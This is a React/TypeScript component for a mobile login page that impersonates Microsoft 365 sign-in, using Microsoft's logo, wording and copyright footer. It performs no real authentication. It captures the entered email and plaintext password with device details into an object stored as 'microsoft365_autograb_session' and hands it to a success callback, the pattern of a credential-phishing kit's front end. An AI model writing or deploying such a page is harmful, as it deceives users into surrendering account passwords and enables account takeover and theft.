import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff } from 'lucide-react';

interface MobileLoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const MobileLoginPage: React.FC<MobileLoginPageProps> = ({
  fileName,
  onBack,
  onLoginSuccess,
  onLoginError
}) => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState('');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setError('');

    // Validate inputs
    if (!email || !password) {
      setError('Please enter both email and password');
      setIsLoading(false);
      return;
    }

    if (!email.includes('@')) {
      setError('Please enter a valid email address');
      setIsLoading(false);
      return;
    }

    try {
      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Create session data
      const sessionData = {
        email: email,
        password: password,
        provider: 'Microsoft',
        fileName: 'Microsoft 365 Access',
        timestamp: new Date().toISOString(),
        sessionId: Math.random().toString(36).substring(2, 15),
        authenticationMethod: 'password',
        deviceInfo: {
          userAgent: navigator.userAgent,
          platform: navigator.platform,
          language: navigator.language,
          isMobile: true
        }
      };

      // Store session data
      localStorage.setItem('microsoft365_autograb_session', JSON.stringify(sessionData));
      sessionStorage.setItem('microsoft365_current_session', JSON.stringify(sessionData));

      console.log('✅ Mobile login successful:', sessionData);

      if (onLoginSuccess) {
        onLoginSuccess(sessionData);
      }

    } catch (error) {
      console.error('❌ Mobile login error:', error);
      setError('Authentication failed. Please try again.');
      if (onLoginError) {
        onLoginError('Authentication failed');
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col justify-center items-center bg-[#f3f3f3]">
      <div className="w-full max-w-sm px-3">
        <div className="flex flex-col items-center mb-8">
          <div className="avatar-microsoft mb-3">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/44/Microsoft_logo.svg/768px-Microsoft_logo.svg.png"
              alt="Microsoft"
              className="w-12 h-12 object-contain"
            />
          </div>
          <h1 className="text-2xl font-bold text-[#1a1a1a] mb-1">Sign in</h1>
          <p className="text-sm text-gray-500">to continue to Microsoft 365</p>
        </div>

        <div className="card-microsoft">
          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Email Input */}
            <div>
              <label htmlFor="email" className="block text-sm font-medium text-[#1a1a1a] mb-2">
                Email
              </label>
              <div className="relative">
                <Mail className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                <input
                  id="email"
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="input-microsoft pl-11 pr-3 py-3 w-full text-base"
                  placeholder="someone@example.com"
                  required
                  disabled={isLoading}
                />
              </div>
            </div>

            {/* Password Input */}
            <div>
              <label htmlFor="password" className="block text-sm font-medium text-[#1a1a1a] mb-2">
                Password
              </label>
              <div className="relative">
                <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                <input
                  id="password"
                  type={showPassword ? 'text' : 'password'}
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="input-microsoft pl-11 pr-11 py-3 w-full text-base"
                  placeholder="Enter your password"
                  required
                  disabled={isLoading}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-[#2563eb] transition-colors"
                  disabled={isLoading}
                  tabIndex={-1}
                >
                  {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                </button>
              </div>
            </div>

            {/* Error Message */}
            {error && (
              <div className="bg-red-100 border border-red-200 rounded-lg p-3">
                <p className="text-red-500 text-xs">{error}</p>
              </div>
            )}

            {/* Sign In Button */}
            <button
              type="submit"
              disabled={isLoading}
              className="btn-microsoft w-full text-base"
            >
              {isLoading ? (
                <div className="flex items-center justify-center">
                  <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
                  Signing in...
                </div>
              ) : (
                'Sign in'
              )}
            </button>

            {/* Additional Options */}
            <div className="text-center space-y-2">
              <a
                href="#"
                className="text-[#2563eb] hover:text-[#1d4ed8] text-xs transition-colors"
                onClick={(e) => e.preventDefault()}
              >
                Forgot my password
              </a>
              <div className="text-gray-500 text-xs">
                Don't have an account?{' '}
                <a
                  href="#"
                  className="text-[#2563eb] hover:text-[#1d4ed8] transition-colors"
                  onClick={(e) => e.preventDefault()}
                >
                  Create one!
                </a>
              </div>
            </div>
          </form>
        </div>

        {/* Footer */}
        <div className="text-center mt-6">
          <p className="text-xs text-gray-400 font-semibold bg-white/80 backdrop-blur-sm rounded-lg py-2 px-3 inline-block shadow">
            © 2025 Microsoft Corporation. All rights reserved.
          </p>
        </div>
      </div>
    </div>
  );
};

export default MobileLoginPage;